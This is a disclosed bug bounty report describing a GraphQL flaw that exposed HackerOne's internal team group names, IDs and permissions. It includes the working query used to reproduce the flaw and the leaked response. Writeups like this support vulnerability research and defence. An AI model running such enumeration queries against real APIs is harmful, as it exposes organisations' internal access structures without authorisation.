# Team object in GraphQL discloses team group names and permissions

## Report Details
- **Report ID**: 343464
- **URL**: https://hackerone.com/reports/343464
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-04-26T14:11:21.961Z
- **Disclosed**: 2018-05-04T01:08:39.247Z

## Reporter
- **Username**: haxta4ok00
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hi team. We can disclosed your team member groups ;)
**Description:**
Because of the communications error, we can disclose the data - `team_member_groups{id,name,permissions}`
### Steps To Reproduce

1. {"query": "query {team(handle:\\\"security\\\"){id,name,handle,██████{total_count},team_member_groups{id,name,permissions}}}"}

Result:
`{"data":{"team":{"id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","name":"HackerOne","handle":"security",
"██████":{"total_count":30},"team_member_groups":[{"id":"7506","name":"Support","permissions":["support_mutation"]},{"id":"8126","name":"Report Only","permissions":["report_management"]},{"id":"8023","name":"Support - SAML","permissions":["support_saml"]},{"id":"8024","name":"Support - Directory","permissions":["support_directory"]},{"id":"9492","name":"Support - Customer Success","permissions":["support_customer_success"]},{"id":"9880","name":"Support - Sales","permissions":["support_sales"]},{"id":"11365","name":"Support - Finance","permissions":["support_finance"]},{"id":"11947","name":"Support - Marketing","permissions":["support_marketing"]},{"id":"16233","name":"Support - Human Resources","permissions":["support_hr"]},{"id":"19143","name":"Support - Hacker Success","permissions":["support_hacker_success"]},{"id":"21045","name":"Program Management","permissions":["program_management"]},{"id":"21046","name":"Support - Open Source Review","permissions":["support_open_source_review"]},{"id":"34558","name":"Kerk Squad","permissions":["report_management"]},{"id":"34881","name":"Support - SQL Query Analyzer","permissions":["support_sql_query_analyzer"]},{"id":"134","name":"Admin","permissions":["user_management","program_management"]},{"id":"135","name":"Standard","permissions":["report_management","reward_management"]}]}}}`

████████

Sorry i bad speak english
I hope you understand me
Thank you,haxta4ok00

## Impact

Disclosed name and permissions groups

## Attachments
No attachments
